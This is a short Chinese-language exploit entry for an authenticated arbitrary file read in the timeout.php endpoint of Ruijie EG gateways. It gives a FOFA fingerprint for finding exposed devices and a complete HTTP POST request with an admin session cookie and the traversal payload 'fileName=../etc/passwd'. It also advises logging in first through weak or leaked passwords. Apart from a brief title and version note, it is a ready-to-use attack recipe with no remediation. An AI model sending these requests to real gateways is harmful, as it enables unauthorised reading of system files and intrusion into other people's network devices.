# 锐捷EG易网关timeout.php后台任意文件读取漏洞

- **系统**：锐捷　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`fofa:`app="Ruijie-EG易网关" `\`
- **请求**：`POST /system_pi/timeout.php?a=getFile HTTP/1.1`

**请求体 / payload**
```
**一、漏洞简介**\
锐捷EG易网关timeout.php后台任意文件读取漏洞\
**二、影响版本**\
锐捷 EG易网关\
**三、资产测绘**\
●登录页面\
fofa:`app="Ruijie-EG易网关" `\

**四、漏洞复现**\
1通过弱口令或账号密码泄露漏洞登录后台获取cookie

2通过上一步获取的cookie执行命令
Content-Type: application/x-www-form-urlencoded
Cookie: LOCAL_LANG_COOKIE=zh; RUIJIEID=bnrul7jabde55u5moo2a4q57a0; helpKey=home_sys;user=admin
X-Requested-With: XMLHttpRequest
Host:
Content-Length: 22
fileName=../etc/passwd
```